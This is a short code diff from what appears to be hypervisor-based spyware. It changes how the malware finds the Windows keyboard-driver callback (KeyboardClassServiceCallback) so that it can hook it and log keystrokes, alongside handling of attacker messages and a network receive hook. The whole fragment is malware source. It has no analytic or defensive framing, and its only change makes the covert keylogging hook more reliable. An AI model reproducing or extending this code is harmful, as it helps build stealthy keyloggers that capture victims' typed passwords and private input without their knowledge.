@@ -165,7 +165,7 @@ BOOL check_if_attacker_msg(byte_t *pkt){
         shared_cores_data.send_requests = FALSE;
 
         // Activate keyboard hook
-        hook_function(guest_virtual_to_physical(shared_cores_data.kbdclass + KBDCLASS_KeyboardClassServiceCallback_OFFSET), &shared_cores_data.memory_shadowing_pages.KeyboardClassServiceCallback_x, shared_cores_data.memory_shadowing_pages.KeyboardClassServiceCallback_rw);
+        hook_function(guest_virtual_to_physical(shared_cores_data.functions.KeyboardClassServiceCallback), &shared_cores_data.memory_shadowing_pages.KeyboardClassServiceCallback_x, shared_cores_data.memory_shadowing_pages.KeyboardClassServiceCallback_rw);
         
         // remove the receive hook
         // *(uint16_t*)guest_virtual_to_physical(shared_cores_data.ndis + NDIS_NdisMIndicateReceiveNetBufferLists_OFFSET) = PUSH_R12;
@@ -180,7 +180,7 @@ BOOL check_if_attacker_msg(byte_t *pkt){
         ReleaseLock(&shared_cores_data.spyware_data_lock);
 
         // Remove keyboard hook
-        *(uint8_t*)guest_virtual_to_physical(shared_cores_data.kbdclass + KBDCLASS_KeyboardClassServiceCallback_OFFSET) = PUSH_RBP;
+        *(uint8_t*)guest_virtual_to_physical(shared_cores_data.functions.KeyboardClassServiceCallback) = PUSH_RBP;
 
         // Start sending requests again
         shared_cores_data.send_requests = TRUE;
